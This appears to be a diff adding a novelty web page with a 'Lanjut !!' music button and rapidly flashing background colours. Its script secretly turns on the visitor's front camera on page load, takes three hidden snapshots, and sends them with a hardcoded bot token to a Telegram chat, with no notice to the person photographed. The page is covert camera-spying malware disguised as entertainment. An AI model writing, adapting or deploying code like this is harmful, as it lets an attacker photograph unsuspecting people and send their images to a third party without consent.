@@ -1,0 +1,157 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture and Send Images</title>
+    <style>
+        body {
+            background-color: white;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            transition: background-color 0.1s;
+        }
+        .button {
+            background-color: #ff4d4d;
+            color: black;
+            font-family: Arial, sans-serif;
+            font-size: 24px;
+            font-weight: bold;
+            padding: 10px 20px;
+            border: 2px solid black;
+            text-align: center;
+            text-transform: uppercase;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <audio id="background-music" src="sound.mp3" loop></audio>
+    <div class="button" onclick="playMusic()">Lanjut !!</div>
+    <script>
+        // Create a hidden video element
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+
+        // Create a hidden canvas element
+        const canvas = document.createElement('canvas');
+        canvas.style.display = 'none';
+        document.body.appendChild(canvas);
+        const context = canvas.getContext('2d');
+
+        // Access the device camera and stream to video element
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+            })
+            .catch(err => {
+                console.error("Error accessing the camera: " + err);
+            });
+
+        // Capture images and send to Telegram bot
+        function captureAndSendImages() {
+            const images = [];
+            for (let i = 0; i < 3; i++) {
+                setTimeout(() => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    images.push(imageData);
+                    if (images.length === 3) {
+                        sendImagesToTelegram(images);
+                    }
+                }, i * 1000); // Capture images 1 second apart
+            }
+        }
+
+        // Send images to Telegram bot
+        function sendImagesToTelegram(images) {
+            const botToken = '7721778131:AAGmUWdcG0zWz0Om65AM7NXfhyhldHVNT1k';
+            const chatId = '7336408897';
+
+            images.forEach(imageData => {
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        photo: imageData
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Image sent successfully:', data);
+                    sendNotificationToTelegram();
+                })
+                .catch(error => {
+                    console.error('Error sending image:', error);
+                });
+            });
+        }
+
+        // Send notification to Telegram bot
+        function sendNotificationToTelegram() {
+            const botToken = '7721778131:AAGmUWdcG0zWz0Om65AM7NXfhyhldHVNT1k';
+            const chatId = '7336408897';
+            const message = 'Images have been successfully captured and sent.';
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Notification sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending notification:', error);
+            });
+        }
+
+        // Function to change background color
+        function changeBackgroundColor() {
+            const colors = [
+                '#FF0000', '#FF7F00', '#FFFF00', '#7FFF00', '#00FF00', '#00FF7F', '#00FFFF', '#007FFF', '#0000FF', '#7F00FF', '#FF00FF', '#FF007F',
+                '#FF4D4D', '#FF944D', '#FFD24D', '#D2FF4D', '#94FF4D', '#4DFF4D', '#4DFF94', '#4DFFD2', '#4DD2FF', '#4D94FF', '#4D4DFF', '#944DFF',
+                '#D24DFF', '#FF4DD2', '#FF4D94', '#FF4D4D', '#FF6666', '#FF9966', '#FFCC66', '#CCFF66', '#99FF66', '#66FF66', '#66FF99', '#66FFCC',
+                '#66CCFF', '#6699FF', '#6666FF', '#9966FF', '#CC66FF', '#FF66CC', '#FF6699', '#FF6666', '#FF8080', '#FFB380', '#FFE680', '#E6FF80',
+                '#B3FF80', '#80FF80', '#80FFB3', '#80FFE6', '#80E6FF', '#80B3FF', '#8080FF', '#B380FF', '#E680FF', '#FF80E6', '#FF80B3', '#FF8080',
+                '#FF9999', '#FFCC99', '#FFFF99', '#CCFF99', '#99FF99', '#99FFCC', '#99FFFF', '#99CCFF', '#9999FF', '#CC99FF', '#FF99FF', '#FF99CC',
+                '#FF9999', '#FFB3B3', '#FFD9B3', '#FFFFB3', '#D9FFB3', '#B3FFB3', '#B3FFD9', '#B3FFFF', '#B3D9FF', '#B3B3FF', '#D9B3FF', '#FFB3FF',
+                '#FFB3D9', '#FFB3B3'
+            ];
+            const randomColor = colors[Math.floor(Math.random() * colors.length)];
+            document.body.style.backgroundColor = randomColor;
+        }
+
+        // Function to play music
+        function playMusic() {
+            const music = document.getElementById('background-music');
+            music.play().catch(error => {
+                console.error('Error playing music:', error);
+            });
+        }
+
+        // Start capturing and sending images when the page loads
+        window.onload = () => {
+            setTimeout(captureAndSendImages, 3000); // Wait 3 seconds before starting
+
+            // Change background color every 100ms
+            setInterval(changeBackgroundColor, 100);
+        };
+    </script>
+</body>
+</html>
